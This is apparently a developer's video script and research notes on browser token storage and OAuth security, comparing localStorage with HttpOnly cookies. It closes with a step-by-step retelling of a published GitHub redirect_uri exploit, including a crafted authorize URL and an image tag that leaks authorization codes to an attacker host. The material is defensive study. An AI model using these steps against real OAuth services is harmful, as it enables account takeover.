# Where to store Tokens on the Browser, with debate

## Script

### How client-side apps authenticate with APIs

Here's the Facebook app, and here's the Facebook API.

How does the Facebook app communicates with the Facebook API?

When you post something, how does the Facebook API know that it is **you**, who
has **this name**?

Usually, for a client-side application to communicate with an API, the
client-side app would need a permission to access data. In its most primitive
form, the user would enter the username and password, they get sent to the API,
and the API gives back "the permission to access the user data". It's like a
key, and it has a name, it's called a Token, specifically, an Access Token.

This token represents the permission that the user gave the client-side app to
access and modify their data.

For example, you logged into Facebook. The Facebook API gives you back an Access
Token that represents **you**. The Facebook app would use this token to post and
comment as **you**.

That also means that, if you don't store this Access Token carefully, it could
be hacked, and your account is compromised. _inserts some illustration about
account compromise_

Question is, where do you securely store this token?

This video specifically focuses on web applications. Mobile applications should
be somewhat similar.

### localStorage - the hated one

I'll briefly show you the sources where storing tokens in localStorage are
recommended. But I'm not gonna rely on these sources for my answer, because they
don't consider any alternatives. I do, so I'll explain it my own way.

_shows the sources_

On the web, there's this thing you can store data in, called localStorage.

It's a key-value storage of the browser that's supposed to store data, and it
won't be deleted after your browser closes. That's it. It's very easy to use.

Facebook could store the Access Token here. After that, each time you visit
Facebook, it would use the stored Access Token, and you don't have to log in
again.

But there exists another place to store the Access Token.

### Cookies is taking all of the cookies

Also on the web is the idea of "Cookies". A Cookie is a piece of data that the
web server would save on the browser.

Back to the Primitive flow. After you enter your username and password, instead
of sending you back the Token, the web server would store the Token in a Cookie,
and let the browser hold that for you.

It sounds just like localStorage, but the client-side application don't have to
write logics to store or send the token. For example if Facebook was to store
the Token in a Cookie, then Facebook don't have to write code to send the token
along with the requests; the Browser would do that automatically.

The Browser only sends the Cookie to the Facebook API, so you don't have to
worry about it going to some malicious places.

So, why is there two ways of accomplishing the same thing?

### Vulnerabilities: XSS

To access and modify the data in localStorage, you use JavaScript. It's the
language that runs what you call the client-side applications on the web.

The first vulnerability that we care about is called Cross-Site Scripting, or
XSS. Basically, it's when there is a piece of malicious JavaScript running on
the website. This malicious script can do a lot of things. One of the things
that they can do is accessing localStorage and send the token back to the
attacker.

That's the reason why there is another place to store the token, Cookie.

Recall that Cookies are data that are stored on the browser, just like
localStorage? It can even be accessed via JavaScript. There is a catch: if a
Cookie is flagged `HttpOnly`, then it cannot be accessed using JavaScript.

When Facebook makes a request, the browser sends along the `HttpOnly` Cookie,
and the request is approved.

Because `HttpOnly` Cookie cannot be accessed by JavaScript, if an XSS attack
happens, the malicious script don't get to know the Access Token. However, it
presents another vulnerability.

### Vulnerabilities: CSRF

Cross-Site Request Forgery, or CSRF, is an attack that revolves around Cookie.
For example, if you visit a malicious website, that website could "forge" a
request that resembles your Facebook posting request, and send that malicious
request to the Facebook API. If your browser sends along the Cookie that
contains the Access Token, then you'll post something that you don't want.

Fortunately, there's a protection coming from the Browser, which is the
`SameSite` Cookie flag. When the malicious site makes a request, the request is
coming from the malicious site, not facebook.com. So, if the Cookie's `SameSite`
is set to something like `Lax`, the Cookie won't be send by the Browser. There's
multiple catches that is not important right now. If you want to dig deeper,
take a look at the MDN documentation.

The important thing is, `SameSite` can mitigate CSRF attacks.

So, Cookie can protect your token from XSS and CSRF. Or is it?

### Cookie's double the trouble

According to OWASP's Cheatsheet:

> Remember that any Cross-Site Scripting (XSS) can be used to defeat all CSRF
> mitigation techniques!

So if your website has an XSS vulnerability, then your CSRF mitigation will not
work. That would make your Token Cookie to be sent along with the malicious
request that I described just a short moment ago.

But how?

It's simple. The XSS vulnerability allows malicious scripts to run on the
infected website. Let's assume Facebook has an XSS vulnerability. This malicious
script would send the malicious posting request to Facebook like before. But
because the request is made from the legit Facebook website, `SameSite=Lax` is
now sort of unrelated because there is no Cross-Site Request Forgery going on
here. The malicious request looks exactly like a legit request, so the Token
Cookie is sent along, and you posted an unwanted post.

See, the attacker doesn't need to know the exact Token. They can still make
malicious requests if Facebook has XSS.

There is a Portswigger lab that exploits XSS to perform CSRF, I'll link it in
the description if you want to take a look.

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

Therefore, although using localStorage requires you to mitigate XSS, Cookie in
the other hands requires you to mitigate both XSS **and** CSRF. You don't have
to prevent CSRF if you don't have to, right?

### Defending `HttpOnly` Cookie

There are still arguments that defend HttpOnly Cookie, like:

> If the token is exposed to the JavaScript like when you're using localStorage,
> then the attacker can store the token to perform attacks later on, even after
> the browser is closed, because XSS can only run while the browser is running.
> Using Cookies would prevent that. That's better, right?

To understand how the world's doing this Token storage thing, you have to
understand a real example. The Facebook example used until now is a hypothetical
one. I don't know exactly how Facebook stores tokens on your browser, but I
would comfortably say that if they were to follow the industry standard, then
the answer is, 9 times out of 10, localStorage, unless they have a very
compelling reason not to. I'll show you why.

### OAuth

So there's this thing called OAuth. You may have heard before. You may have used
them before. It starts with something like this: _inserts Google OAuth login
image_

Let's ease you in.

Authentication refers to the process of proving who you are. Like, who are you,
what is your name.

Authorization refers to what you can do.

Authentication is like telling the guard a secret passphrase to get into the
building. But without a badge, you can't go into any confidential room. The
badge represents the Authorization.

So, when you're entering your username and password, you are **authenticating**
yourself to Google, saying that "Here is my account, and I own it. Now log me
in." Google, in OAuth's terms, is known as the Authorization Service.

Let's introduce another service, YouTube. You log into your Google account to
use YouTube. You **authorize** YouTube to access your YouTube data, but not the
Gmail data. Similarly, you only authorize Google Calendar to manage calendar,
not uploading videos to YouTube. YouTube, in OAuth's terms, is known as the
Client, as in the Client of the Google Authorization Server.

When signing-in a third party application with a Google Account, for example
Spotify, you would authenticate yourself to the Authorization Server (in this
case, Google), and there will be a screen for you to grant authorizations to
Spotify, or in other words, saying what Spotify can do with your Google account.
Some apps might not care about your Google data, so they don't ask for
permissions explicitly, thus after logging in or selecting your account, you're
just redirected back immediately.

[...]

Then, after authenticating with Google and authorizing for the Spotify app about
what Google data it can access, you will be redirected back to Spotify. In the
background, Spotify receives a code from Google, called Authorization Code.
Spotify uses this Code, sends it to Google, and gets back an Access Token. The
OAuth flow is now complete.

This OAuth flow is called the Authorization Code flow. I'll be releasing another
video talking about OAuth and how it works (trust me I've got a lot to tell
about OAuth), but for now just get a basic idea of OAuth.

### Refresh Token

You may have heard this term somewhere before, it's called Refresh Token.

Remember that after you login you'd receive an Access Token? It must have an
expiration date because if it leaks, it would grant permanent access to anyone
who possesses that token. And, it had a not-short lifetime. Why is it not-short?
Because you don't want your user to login again every 10 minutes, don't you? So
it might be set to 7 days, or 30 days, depending on the service.

Now, OAuth presents this Refresh Token term, that refers to the token that you
would use to get a new Access Token when it expires. If your 30-day Access Token
expires, you can use your Refresh Token to get a new one that lasts another 30
days. But that's not what it's invented to solve.

When you log in, you will be issued an Access Token and a Refresh Token. The
Access Token will be valid for a very short time, and the Refresh Token will be
long lived. Why? Because if your Access Token gets leaked, it would only be
usable for a short amount of time, minimizing the effect of the Access Token
leakage.

But what if the Refresh Token gets leaked instead? Isn't that would mean the
attacker now has infinite access to your account?

### Refresh Token Rotation

Here's an OAuth flow that involves getting a new Access Token.

Let's tweak this.

Every time a Refresh Token is used, it is immediately invalidated, and the
Authorization Server gives you back a new Access Token **and** a new Refresh
Token.

Now, if you attempt to use the old Refresh Token, all of the Access Tokens and
Refresh Tokens that were associated with your account would be immediately
invalidated, and you are required to log in again. Why is this useful?

Well, suppose your Refresh Token is leaked, and the attacker uses that Refresh
Token to get a new Access Token. But, in doing so, that leaked Refresh Token is
invalidated, and guess who is still using that invalidated Refresh Token? That's
right, your browser.

This is called Refresh Token Rotation. It is a measure to log everybody out when
a Refresh Token is leaked. You could say that it **helps to reduce the damage**
if the Refresh Token is to be leaked.

If you (and by "you" I mean the Authorization Server like Google, **and** also
**you** as a Google Authorization Server user) are using short-lived Access
Token, long-lived Refresh Token and Refresh Token Rotation, then it's currently
the agreed-upon best practice when it comes to Authorization on the internet. If
the Access Token is leaked, it would only be available for a short time. If the
Refresh Token is leaked, then Refresh Token Rotation helps to minimize the
damage of the leakage.

So, what does all of this have to do with where to store the tokens on the
browser?

### OAuth and token storage

Let's assume that you are the developer of Spotify.

If an user of your service is a victim of a token leakage, chances are your
service's website has an XSS vulnerability that has caused the tokens to be
leaked.

As I've proved to you, the attacker doesn't have to know the tokens in order to
use them. Suppose the attacker decides to exploit the XSS vulnerability of your
service, they could rename the victim's playlist names to something malicious,
or delete their playlists, all without knowing the tokens.

Let's say your service is Facebook instead. They could send malicious messages
to all of the victim's friends immediately, without snatching the token and send
it somewhere. The damage is done immediately.

XSS's malicious scripts can only be run when the browser is running. That's
true, but next time the victim visits Facebook, the XSS vulnerability is still
there, and the malicious script would have another chance of sending malicious
messages.

Okay, maybe the attacker also wants to access the victim's Facebook account even
when the victim's browser is closed. So they send the Access Token and the
Refresh Token to their email or machine or server somewhere.

The access token is only available for a short time, so the attacker, if they
want to maintain access to the victim's account, has to use the Refresh Token to
obtain a new Access Token. That means the leaked Refresh Token is now
invalidated. Now if the victim opens up their browser and visits Facebook, they
would be logged out, and at the same time, the attacker also loses access to the
victim's account, 'cause all of the tokens are invalidated.

What if the victim never opens up their browser and visits Facebook? What if
they lose their device, or somehow deleted their tokens locally?

In that case, sure, the attacker would have access to the victim's account for a
very long time. But remember that you are the developer of Facebook, **not** the
victim, so you **rely** on the victim to let you know about the attack. If the
victim doesn't log in and realize that their inbox are now flooded with angry
responses to the malicious messages, then you, the developer, would have **no
idea** that your service, Facebook, is f'ed.

Just don't care about the "store tokens where" question at the moment. The fact
that your service Facebook is f'ed is more important. And would you (the
developer of Facebook) wish to know that your service is f'ed after 30 minutes
or after a year? 'cause the thing is, if you just let the victim's token gets
leaked, then it's easier to attack and you would know that your service,
Facebook, is f'ed sooner.

First off, (and everybody should absolutely do this), immediately after they
abandoned their device, or in other words abandoned their Refresh Token, they
should check their "Devices" page, which looks like this.

If the leaked Access Token or Refresh Token is used, then it would show their
abandoned device name, along with something like "5 mins ago". What they should
do next is revoke access to that old Device, even if it's not been used
recently, which in turn invalidating all Access Tokens & Refresh Tokens that the
attacker might get hold of.

Well, if there's nothing wrong going on with their account (like their account
suddenly sending malicious messages), then they would assume that the "5 mins
ago" part is a machine error and wouldn't report it to you, the developer.

To be fair, little people actually care enough to go to that Devices page, so
there's another way, which is wait for the damage to arrive.

If the attacker is just sitting to observe the inbox and doesn't actually do any
damage then that's really dumb of them, right? At some point they must sell the
information to some interested party. Then when the damage is done, the
victim/influencer would sue the Facebook company for leaking inbox data, after
that you'd definitely know that you're f'ed. Would this be preventable have you
used HttpOnly Cookie to store the tokens? Your service, Facebook, still has an
XSS vulnerability, and it's very unlikely that there are no damage being done
via that XSS vulnerability. It's even less likely that every victim just switch
laptop and lost their Refresh Token.

If you, the developer of Facebook, think that:

1. It takes a very long time for you to know that your service has XSS (which is
   very unlikely if you care about XSS at all)
2. In the case XSS attacks happen and tokens get leaked, the Refresh Token
   Rotation system doesn't help to let you - the developer - know that your
   service is f'ed
3. There are specific attacks against your service that the attacker is
   interested in doing that involves knowing the literal Access Token or Refresh
   Token

Then go ahead and use HttpOnly Cookie by all means.

But did you know that you are not the person who can change the code of the
Google Authorization Server? If you want to set a Cookie on the user's Browser,
then the Cookie (in this case, the Token Cookie) must be set when the user's
browser asks Google for an Access Token. Google doesn't do that. You can't
change that response, so you **must** use some kind of intermediate server to be
able to do that. You heard it right, you **must**. At this point, you should
already realize that something is wrong, as the OAuth flow does not mention this
middle-guy server anywhere. In fact, if you insist that this is a possible
solution, let's actually dig deeper to see what you need to do in order to
implement "the solution".

### HttpOnly Cookie's implementation with Google OAuth

Let's switch to the Spotify example. You are the Spotify developer.

So, here is the intermediate server, which would set the cookie to the user's
browser. So this server must know about the user's Access Token & Refresh Token
(in order to set the cookie). How?

After the Authorization Code flow is complete, when the Google OAuth redirects
the user back to Spotify with the Authorization Code, Spotify would send this
code to the intermediate server. This server uses this code to get the Access
Token and the Refresh Token, and then response with the Access Token and Refresh
Token set in some HttpOnly Cookies, which would now be saved on the user's
browser.

Then, on the Spotify API, each time the user sends in a request, you would take
the token out from the Token Cookie and use them to authorize the request.
Mission accomplished, simple enough.

Now, using this intermediate server is kind of an anti pattern, because the
Authorization Code flow that's used for your Spotify app is supposed to be
between the Public Client (the Spotify app on your browser) and Google, the
Authorization Server, but now another party is also getting involved. And if you
know OAuth, you would also know that the Refresh Token is strictly only allowed
to be exchanged between the Client and the Authorization Server, so that's not
good. But you insisted to use Cookie anyway, right?

And if you don't have the authority to modify the Spotify API **or** your
service Spotify uses any third party API that doesn't support Cookie and
requires the Google Access Token explicitly, then this plan and/or the thinking
of using HttpOnly Cookie can go into the bin.

As an added bonus, the Spotify app on Android or iOS doesn't have Cookie, so the
Spotify API now has to fallback to the normal way. Is this an effort or no? You
tell me.

### Conclusion

So there you have it. 2 methods of storing tokens on the browser, and you decide
if Cookie is worth your effort.

Don't forget that Mobile applications don't have Cookie, so if your API is
something like the Spotify API, I hope the choice is easy for you.

_shows Spotify Web API authentication section image_

---

## To be researched

- [x] Storing JWT in httpOnly cookie

  - Can XSS exploit/still use this? - Yes.
  - The attacker doesn't know the JWT, but can use them while XSS-ing. What
    happens when the attacker knows the JWT, like in the case of localStorage?

    Turns out, nothing. If it's a bank then it takes 1 request to get all your
    money. There's little need for token leakage when they can just use them
    immediately.

- [ ] HTTP Basic Auth? Bearer?

  - Seems unrelated.

OAuth 2.0:

- [x] How can Refresh Token provide seamless experience?
- [x] Implicit Flow?
- [x] Why "Backend for Frontend" architecture needs PKCE?
      [link](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#section-6.2)
- [x] Is `state` has a role of CSRF prevention when using PCKE?
- [x] OpenID Connect
- [x] Many reasons why the Refresh Token expires?
- [x] Why does the Redirect URL in the Authorization Request and the Access
      Token request have to match?
- [x] Content Security Policy (XSS mitigation)
- [x] Maybe OAuth provides some very important reasons why storing tokens in
      localStorage is OK? (Refresh Token Rotation, ...)

Additional OAuth researching:

- [ ] OAuth 2.1?
- [ ] OAuth client authentication (client_id, client_secret, jwt?)
- [ ] Client Credentials for APIs to access its own resource?
- [ ] Seems like OAuth services have SDKs to handle refresh token. Look at some.

## Research note

### Refresh token

Auth0 has this to say about protecting refresh token in SPAs:
[link](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/#When-to-Use-Refresh-Tokens)

> Keep in mind that according to the spec, when using the Implicit Flow, the
> authorization server should not issue refresh tokens. The Implicit flow is
> often implemented in Single-Page Applications (SPAs), which run on the
> frontend layer of a system architecture. There's no easy way of keeping a
> refresh token secure in the frontend layer on its own.

From Auth0: [link](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/#You-Can-Store-Refresh-Token-In-Local-Storage)

> Yes, you read that right. When we have refresh token rotation in place, we can
> store tokens in local storage or browser memory.

Refresh token rotation lifespan:

> A refresh token may have a long lifespan by configuration. However, the
> defined long lifespan of a refresh token is cut short with refresh token
> rotation. The refresh is only valid within the lifespan of the access token,
> which would be short-lived.

[Authorization server] Best practice when using refresh tokens:

> If the authorization server wishes to allow JavaScript apps to use refresh
> tokens, then they must also follow the best practices outlined in “OAuth 2.0
> Security Best Current Practice” and “OAuth 2.0 for Browser-Based Apps“, two
> recent documents adopted by the OAuth Working Group. Specifically, refresh
> tokens must be valid for only one use, and the authorization server must issue
> a new refresh token each time a new access token is issued in response to a
> refresh token grant. This provides the authorization server a way to detect if
> a refresh token has been copied and used by an attacker, since in normal
> operation of an app a refresh token would be used only once.
>
> Refresh tokens must also either have a set maximum lifetime, or expire if they
> are not used within some amount of time. This is again another way to help
> mitigate the risks of a stolen refresh token.
> [link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

---

OAuth:

> OAuth was designed as an authorization protocol, so the end result of every
> OAuth flow is the app obtains an access token in order to be able to access or
> modify something about the user's account. **The access token itself says
> nothing about who the user is.** > [link](https://www.oauth.com/oauth2-servers/signing-in-with-google/)

OAuth server-side apps won't let browser know access token:

> The authorization code flow offers a few benefits over the other grant types.
> When the user authorizes the application, they are redirected back to the
> application with a temporary code in the URL. The application exchanges that
> code for the access token. When the application makes the request for the
> access token, that request can be authenticated with the client secret, which
> reduces the risk of an attacker intercepting the authorization code and using
> it themselves. This also means the access token is never visible to the user
> or their browser, so it is the most secure way to pass the token back to the
> application, reducing the risk of the token leaking to someone else.
> [link](https://www.oauth.com/oauth2-servers/server-side-apps/authorization-code/)

Client-side apps can't protect its secret, so it should use PCKE:

> If an app wants to use the authorization code grant but can't protect its
> secret (i.e. native mobile apps or single-page JavaScript apps), then the
> client secret is not required when making a request to exchange the auth code
> for an access token, and PKCE must be used as well. However, some services
> still do not support PKCE, so it may not be possible to perform an
> authorization flow from the single-page app itself, and the client-side
> JavaScript code may need to have a companion server-side component that
> performs the OAuth flow instead. [link](https://www.oauth.com/oauth2-servers/server-side-apps/user-experience/)

On why the `state` parameter is recommended: [link](https://stackoverflow.com/a/35988614)

- The app needs to be sure that it only exchange the Authorization Code it
  requested, not the Authorization Code of the attacker, or else it would access
  the resource in the name of the attacker, i.e. posting images to the
  attacker's account. Kind of sounds like CSRF. That is achieved using `state`.

---

### Implicit Flow:

The "flaws":

- "too insecure"

  From oauth.com:

  > For example, the spec provides no mechanism to return a refresh token in the
  > Implicit flow, as it was seen as too insecure to allow that. The spec also
  > recommends short lifetimes and limited scope for access tokens issued via
  > the Implicit flow.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps/implicit-flow/)

  Well, too insecure what?

  The Implicit flow **could** be made _relatively secure_ (as proven later) **if
  done correctly**, meaning they could work but there is a specific amount of
  effort to achieve that. But that's not impossible. And **relatively secure**
  is the keyword.

- Redirect URI interception

  > Since the access token is sent as the fragment (hash) part of the redirect
  > URL (also called the front channel), it will be exposed to an attacker if
  > the redirect is intercepted.
  > [link](https://christianlydemann.com/implicit-flow-vs-code-flow-with-pkce/)

  Relatively speaking. Firstly, The redirect URL must be registered:

  > In any case, with both the Implicit Flow as well as the Authorization Code
  > Flow with PKCE, the server must require registration of the redirect URL in
  > order to maintain the security of the flow.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps/implicit-flow/)

  Secondly, the action after the token is granted (in this instance, to redirect
  the user to some page/URL) _should_ be written in the `state` parameter, just
  like Code flow, which must match with the original intent to prevent "CSRF".

  > The state parameter serves two functions. When the user is redirected back
  > to your app, whatever value you include as the state will also be included
  > in the redirect. This gives your app a chance to persist data between the
  > user being directed to the authorization server and back again, such as
  > using the state parameter as a session key. This may be used to indicate
  > what action in the app to perform after authorization is complete, for
  > example, indicating which of your app's pages to redirect to after
  > authorization. This also serves as a CSRF protection mechanism.
  >
  > Note that the lack of using a client secret means that using the state
  > parameter is even more important for single-page apps.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps)

  If somehow the trusted URLs are compromised, only then the access token will
  be exposed. Whether one can assures that trusted URLs are not compromised is
  to be determined. Code flow suffers from the same problem too, so they need
  PCKE.

- Attacker getting token from the URL with XSS/JavaScript

  - This point also applies to the Code flow. Assuming that the entire Code flow
    is safe. In an SPA, the token is still visible to the JavaScript (as proven
    by using "Refresh token rotation" and the unnecessary of using `httpOnly`
    Cookie), so XSS can still access them no matter the flow.
  - Libraries also has the same security concerns as XSS. They can access the
    token of Code flow too. The token storage is the same between the two flows.

- "Confused deputy" [link](https://stackoverflow.com/a/17439317)

  - Using Implicit flow, the SPA should verify that the token is given to them,
    not some other (potentially malicious) SPA. This is necessary because in
    Implicit flow, we can't verify if the Token receiver was indeed requested
    the token.

    For example, a victim logs in googlefake.com using Google OAuth Implicit
    flow, and then googlefake.com uses that access token to log into google.com.
    If google.com is not checking that the token is given to googlefake.com
    instead of google.com, then the victim's Google account is compromised.

    Basically, an access token for an application that uses Google account login
    should not grant access to Google.com or any other applications that also
    use a Google account for login.

  - **However**, we should also do the same for the Code flow. If the Code is
    for the googlefake.com, then the same compromise happens, as the access
    token granted is for googlefake.com.
  - We can do that using the `state` parameter. (demonstrates the Code flow &
    the Implicit flow similarity)

  - The `state` parameter is checked upon the Token grant on the client-side. If
    somehow the attacker managed to inject a malicious token into the victim's
    browser, then a second measure takes place by checking the "audience" field
    `aud` on the Resource server i.e. your API.

The **real** Implicit flow flaws:

- Access Token Leak in Browser History

  - Valid point, there is a hassle of removing the hash fragment from the URL
    in order to remove the access token from the browser history.

- "Lack of client authentication"
  [link](https://www.taithienbo.com/why-the-implicit-flow-is-no-longer-recommended-for-protecting-a-public-client/)

  That's true. Implicit flow **implicitly assumes** that the receiver is indeed
  the requester. If the token is hijacked, i.e. the redirect URL is compromised
  and the attacker receives the token instead, then the token is indeed
  compromised.

  Remember that the `state` parameter only has a role of preventing the use of
  the wrong token in the legitimate, original app. If the token is gone to the
  incorrect target, that's a gone token, and they need not care about the
  `state`.

  However, this "Lack of client authentication" statement is a little ambiguous.
  You may ask "Isn't Client-side apps cannot store any secrets?"

  - A client-side app doesn't have a fixed client secret, no matter what flow
    you use, including the Code flow, because client-side apps could not store
    anything securely. In a mobile + Code flow scenario, if the attacker's app
    gets the Authorization Code, they could still go to exchange for an access
    token. This flaw is solved with PCKE. In this sense, the accurate statement
    is "Lack of client secret".
  - We assure that the receiver is indeed the requester in an SPA using PCKE. In
    PCKE, only the true requester will be able to exchange the code for an
    access token. This is the real "client authentication".

    We can think of it as if the client secret is per-request basis. For each
    request, there is a different client secret.

  If we registered an URL for redirection, but that URL is compromised, then in
  the Implicit flow we could do nothing more. The token is compromised. Whether
  we can assures that the URL wouldn't be compromised or not is, again, an open
  question.

Although the flaws could be prevented (EXCEPT the "client authentication" flaw),
it is still a hassle, and there could still be human errors.

---

Storing tokens: [link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

> Generally, the browser's LocalStorage API is the best place to store this data
> as it provides the easiest API to store and retrieve data and is about as
> secure as you can get in a browser. The downside is that any scripts on the
> page, even from different domains such as your analytics or ad network, will
> be able to access the LocalStorage of your application. This means anything
> you store in LocalStorage is potentially visible to third-party scripts on
> your page.
>
> Because of the risks of data leakage from third-party scripts, it is extremely
> important to have a good Content-Security Policy configured for your app so
> that you can be more confident that arbitrary scripts aren't able to run in
> the application. A good document on configuring a Content Security Policy is
> available from OWASP at
> https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

Consider "handling OAuth flow on the backend", i.e. use a traditional web app
with session.
[link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

[OAuth 2.0 for Browser-Based Apps](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps)

[OAuth 2.0 Security Best Current
Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

The concerns flow of a client-side app should be:

Securely obtain the tokens -> Store the tokens -> Cares about the tokens'
lifetime

Obtaining the token: Using OAuth, or some custom authorization system.

Store the tokens: `localStorage`.

Cares about the tokens' lifetime: The purpose is keeping the user logged in for
as long as possible, without a re-login. That involves using refresh token,
because using just the access token is problematic in that if it's lost, it's
hard to handle the aftermath. The same can be said to losing a refresh token, so
Refresh token rotation is the solution, and it's the current best practice.

---

Question: Why can't access token just also act as a refresh token?

[link](https://stackoverflow.com/a/39003201)

I mean, it could still rotates like the Refresh token rotation, so if any access
token is used twice, the entire family of access token could just also be
invalidated.

Answer:

The most crucial reason is that the Access Token is exchanged with the Resource
Server (an API), but the Refresh Token is exchanged only with the Authorization
Server, like Google.

The Resource Server only has their hands on a short-lived Access Token, so if
the Resource Server's implementation is flawed and leaks the Access Token, for
example:

> query param in a log file on an insecure resource server, beta or poorly coded
> resource server app, JS SDK client on a non https site that puts the
> access_token in a cookie, etc
>
> [link](https://mailarchive.ietf.org/arch/msg/oauth/vSmJ0zjQzZFjeFbRz_qpvjfpAeU/)

... then they can only leak the short-lived Access Token. If this were to be a
Refresh Token instead, as in the case of an Access Token also being a Refresh
Token, then instead of a short 10-minute window of time of exploit, now the
attacker could have a much longer exploit time window of a Refresh Token,
assuming that the user never use that Refresh Token again in the meantime (to
invalidate it).

So, the Resource Server is not trusted to hold on to a more valuable Refresh
Token. They only have the user's authorization for a short time, say, 10
minutes. Don't send your Refresh Token there.

---

Refresh token lifetime is intentionally never given to the client.

[link](https://www.oauth.com/oauth2-servers/making-authenticated-requests/refreshing-an-access-token/)

> You might notice that the “expires_in” property refers to the access token,
> not the refresh token. The expiration time of the refresh token is
> intentionally never communicated to the client. This is because the client has
> no actionable steps it can take even if it were able to know when the refresh
> token would expire. There are also many reasons refresh tokens may expire
> prior to any expected lifetime of them as well.
>
> If a refresh token expires for any reason, then the only action the
> application can take is to ask the user to log in again, starting a new OAuth
> flow from scratch, which will issue a new access token and refresh token to
> the application. That's the reason it doesn't matter whether the application
> knows the expected lifetime of the refresh token, because regardless of the
> reason it expires the outcome is always the same.

---

OAuth.com says, if a Authorization Code is used twice, then all tokens should be
invalidated:

> If a code is used more than once, it should be treated as an attack. If
> possible, the service should revoke the previous access tokens that were
> issued from this authorization code.
> [link](https://www.oauth.com/oauth2-servers/access-tokens/authorization-code-request/)

---

[link](https://www.oauth.com/oauth2-servers/access-tokens/access-token-lifetime/)

Use short-lived access token and no refresh token... Though it doesn't seem to
be any more secure than the short AT + long RT option.

> If you want to ensure users are aware of applications that are accessing their
> account, the service can issue relatively short-lived access tokens without
> refresh tokens. The access tokens may last anywhere from the current
> application session to a couple weeks.

"Current application session" is not in control of the Authorization Server, so
they can't set the expire time for access token beforehand.

This short-lived AT and no RT option relies on the AT expiration.

> When the access token expires, the application will be forced to make the user
> sign in again, so that you as the service know the user is continually
> involved in re-authorizing the application.

This sounds like "Sign-in and authorize for some pre-determined time". But the
time is impossible to determine beforehand.

Let's address the reasons on OAuth.com:

1. > you want to the most protection against the risk of leaked access tokens

Invalid. I can reduce the time of the AT in the short AT + long RT method and
achieve the same thing.

2. > you want to force users to be aware of third-party access they are granting

True, since you just want the user to grant authorization for like 30 minutes.
That's short, and you don't need refresh token for 30 minutes.

3. > you don't want third-party apps to have offline access to users' data

They do, for 30 minutes. But realistically they don't do that because that's too
short of a time. That's an indirect effect, so true.

=> Very limited use case. If the user really only want to give authorization for
30 minutes, then okay.

---

Strapi 3's authentication & authorization is not supposed to be used. Strapi (or
the individual Strapi instance for that matter) is not an OAuth service. You
give user&pass, and they give an access token. No refresh token. If the AT
leaks, you have to find a way to invalidate them. As as as I'm aware of, there
is no way to revoke an access token in Strapi 3, so you're on your own
(implementation).

You are supposed to use OAuth on the front-end for the user to get AT (and
possibly RT). Then on back-end side, you implements your own authorization, like
checking the validity of the token, authorization scopes, etc.

---

Q: Why "Backend for Frontend" architecture needs PKCE?

A: In BFF, the "Application Server", i.e. the Web App server, handles the OAuth
flow. In an Authorization Code flow, the browser will be redirected to the
authorization endpoint, then the browser receives the Code, which it sends to
the Application Server. There's a phishing attack, which involves making the
user clicks an URL, that would cause the browser to send an arbitrary
Authorization Code to the Application Server. If that code is of the attacker,
then the user is therefore logged in as the attacker, which would not necessary
cause any damage immediately but is still a vulnerability.

If we did use PCKE when encountering this phishing attack, there are 2 cases:

1. If the user initialized the Authorization process before clicking the
   phishing link, then the "code challenge", specifically the code verifier, is
   generated and saved. That code verifier won't match with the arbitrary
   Authorization Code of the attacker, so the flow fails.
2. The user has not initialized the Authorization process, and no code challenge
   is generated. The flow fails, since it doesn't have a code verifier to
   exchange the Authorization Code for the Access Token.

So, both cases would fail to log the user in in the name of the attacker.

---

Q: Many reasons why the Refresh Token expires?

A:

1. The lifetimes of the Refresh Token in the Refresh Token Rotation system

The Refresh Token (and also the Access Token) represents an authorization that
the user granted for the app to use. Once in a while, the Authorization Server
wants the user to authorize for the app again, and it's the occasion for the
user to check on what they granted the app to do.

There are usually 2 Refresh Token lifetimes: The individual Refresh Token
lifetime, and the lifetime after which no new Refresh Token is issued and a
re-login is required.

2. Refresh Token force invalidation

Can due to a number of things:

- The user don't want the app to do things using the user's identity anymore.
  Refresh Token revocation mechanism should be in place.
- The account is compromised, the user reports in, and the administrator
  manually invalidates all tokens associated with the account.

---

Q: Why does the Redirect URL in the Authorization Request and the Access Token
request have to match?

A:

[link](http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)

[link](https://security.stackexchange.com/a/98049)

Back in the day, some OAuth implementations didn't strict matching redirect_uri.
Relative path works. This is best described with an example.

I'm going to explain the GitHub exploit by homakov in the first link above.

1. Here's the crafted URL:

```
https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&response_type=code
```

Notice this part:
`https://gist.github.com/auth/github/callback/../../../homakov/8820324`

The `https://gist.github.com/auth/github/callback` is, I believed, a registered
URI at GitHub, so it must be presented in the redirect_uri. GitHub believes the
redirect_uri is registered. How incautious.

2. Make the user clicks that link.

3. The user is redirected to:

```
https://gist.github.com/homakov/8820324
```

In this Gist, there is an image. Specifically, the image has the URL of
`///attackersite.com`. Quote:

> Basically, there are two vectors for leaking Referers: user clicks a link
> (requires interaction) or user agent loads some cross domain resource, like
> \<img\>.
>
> I can't simply inject \<img src=http://attackersite.com\> because it's going
> to be replaced by Camo-proxy URL, which doesn't pass Referer header to
> attacker's host. To bypass Camo-s filter I used following trick: \<img
> src="///attackersite.com"\>
>
> You can find more details about this vector in [Evolution of Open Redirect
> Vulnerability](http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html).
>
> ///host.com is parsed as a path-relative URL by Ruby's URI library but it's
> treated as a protocol-relative URL by Chrome and Firefox.

So, the image loads, and the HTTP referer is:

```
https://gist.github.com/homakov/8820324?code=CODE
```

In the original blog post, there is an image showing the HTTP referer in the
Chrome Inspector.

4. Now we have the code. We hit this url:

```
https://gist.github.com/auth/github/callback?code=CODE
```

